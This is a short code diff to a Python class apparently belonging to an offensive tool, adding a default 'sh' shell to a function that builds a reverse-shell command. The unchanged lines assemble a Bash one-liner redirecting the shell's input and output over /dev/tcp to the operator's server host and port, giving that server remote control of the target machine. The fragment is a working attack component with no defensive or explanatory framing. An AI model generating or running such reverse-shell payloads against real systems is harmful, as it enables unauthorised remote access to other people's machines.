@@ -27,6 +27,8 @@ class payload:
 
 	def run(self,server):
 		shell = input(h.info_general_raw("Target shell: ")).strip(" ")
+		if shell == "":
+			shell = "sh"
 		h.info_general("Creating payload...")
 		payload = shell+" &> /dev/tcp/"+server.host+"/"+str(server.port)+" 0>&1"
 		h.info_command(payload)
